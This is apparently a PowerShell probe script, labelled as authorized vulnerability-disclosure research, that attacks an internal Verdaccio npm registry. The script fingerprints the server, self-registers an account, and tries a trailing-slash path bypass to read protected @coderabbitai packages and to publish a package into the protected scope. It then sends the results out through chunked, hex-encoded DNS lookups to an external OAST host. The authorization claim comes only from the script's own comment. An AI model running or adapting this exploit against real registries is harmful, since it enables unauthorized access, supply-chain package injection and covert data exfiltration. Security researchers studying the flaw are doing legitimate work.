# Benign Verdaccio access-control probe for authorized CodeRabbit VDP research (ireniumsecurity).
# Creates a NEW package name in a protected scope, then deletes it. Touches no existing package.
$ErrorActionPreference = 'SilentlyContinue'
$OAST = 'dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live'
$R = $env:NPM_CONFIG_REGISTRY
if (-not $R) { $R = 'http://10.64.0.28:4873' }
$R = $R.TrimEnd('/')
$out = [ordered]@{}

function Send-Exfil([string]$s) {
    try {
        $h = -join ([System.Text.Encoding]::UTF8.GetBytes($s) | ForEach-Object { $_.ToString('x2') })
        for ($i = 0; $i -lt $h.Length -and $i -le 480; $i += 48) {
            $chunk = $h.Substring($i, [Math]::Min(48, $h.Length - $i))
            try { [System.Net.Dns]::GetHostAddresses("psc-$([int]($i/48))-$chunk.$OAST") | Out-Null } catch {}
        }
    } catch {}
}

function Req($method, $url, $body, $headers) {
    try {
        $p = @{ Uri = $url; Method = $method; UseBasicParsing = $true; SkipHttpErrorCheck = $true; TimeoutSec = 6; MaximumRedirection = 0 }
        if ($body) { $p.Body = $body; $p.ContentType = 'application/json' }
        if ($headers) { $p.Headers = $headers }
        $r = Invoke-WebRequest @p
        return @{ s = [int]$r.StatusCode; b = [string]$r.Content }
    } catch {
        return @{ s = -1; b = [string]$_.Exception.Message }
    }
}

# 1. fingerprint (capture UI version string)
$a = Req 'GET' "$R/-/ping" $null $null; $out.ping = "$($a.s)"
$b = Req 'GET' "$R/" $null $null
$m = [regex]::Match($b.b, 'Verdaccio[^<"\s]{0,24}')
$out.root = "$($b.s):" + $(if ($m.Success) { $m.Value } else { 'nover' })

# 2. self-registration
$user = 'crvdp' + (-join (1..6 | ForEach-Object { '0123456789abcdef'[(Get-Random -Maximum 16)] }))
$tok = ''
$reg = @{ name = $user; password = "CrVdp-$user-9x!" } | ConvertTo-Json -Compress
$r = Req 'PUT' "$R/-/user/org.couchdb.user:$user" $reg $null
$out.reg = "$($r.s)"
try { $tok = ($r.b | ConvertFrom-Json).token } catch {}
$out.tok = $tok.Length

# 3. read-bypass: plain vs trailing slash; log the error text for the plain request
$e = '@coderabbitai%2fconfig'
$x = Req 'GET' "$R/$e" $null $null
$y = Req 'GET' "$R/$e%2f" $null $null
$out.rc = "$($x.s)/$($y.s)"
$out.rce = $x.b.Substring(0, [Math]::Min(60, $x.b.Length))
$e2 = '@coderabbitai%2fcarrot-ui'
$x2 = Req 'GET' "$R/$e2" $null $null
$y2 = Req 'GET' "$R/$e2%2f" $null $null
$out.ru = "$($x2.s)/$($y2.s)"

# 4. publish-bypass: NEW package name in the protected scope, benign prerelease, no dist-tag
if ($tok.Length -gt 0) {
    $pkg = "@coderabbitai/crvdp-probe-$user"
    $ver = '0.0.0-crvdp'
    $tmp = Join-Path ([IO.Path]::GetTempPath()) ("crpkg-" + $user)
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
    ('{"name":"' + $pkg + '","version":"' + $ver + '"}') | Set-Content -Path (Join-Path $tmp 'package.json') -Encoding utf8
    Push-Location $tmp
    $packOut = (npm pack 2>&1 | Out-String)
    Pop-Location
    $tgz = Get-ChildItem -Path $tmp -Filter '*.tgz' | Select-Object -First 1
    $out.pack = if ($tgz) { 'ok' } else { $packOut.Substring(0, [Math]::Min(60, $packOut.Length)) }
    if ($tgz) {
        $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tgz.FullName))
        $sha1 = (Get-FileHash -Algorithm SHA1 -Path $tgz.FullName).Hash.ToLower()
        $len = $tgz.Length
        $manifest = @{
            _id = "$pkg/"; name = "$pkg/"; 'dist-tags' = @{};
            versions = @{ $ver = @{ name = $pkg; version = $ver; dist = @{ shasum = $sha1; tarball = "$R/$pkg/-/probe-$ver.tgz" } } };
            _attachments = @{ "probe-$ver.tgz" = @{ content_type = 'application/octet-stream'; data = $b64; length = $len } }
        } | ConvertTo-Json -Depth 10 -Compress
        $hdr = @{ Authorization = "Bearer $tok" }
        $enc = $pkg.Replace('/', '%2f')
        $ctl = Req 'PUT' "$R/$enc" $manifest $hdr
        $pub = Req 'PUT' "$R/$enc%2f" $manifest $hdr
        $out.pub = "$($ctl.s)/$($pub.s)"
        $out.pubb = $pub.b.Substring(0, [Math]::Min(70, $pub.b.Length))
        if ($pub.s -eq 200 -or $pub.s -eq 201) {
            $g = Req 'GET' "$R/$enc%2f" $null $null
            $rev = ''
            try { $rev = ($g.b | ConvertFrom-Json)._rev } catch {}
            if ($rev) {
                $d = Req 'DELETE' "$R/$enc%2f/-rev/$rev" $null $hdr
                $out.del = "$($d.s)"
            }
        }
    }
}

Send-Exfil (($out | ConvertTo-Json -Compress))
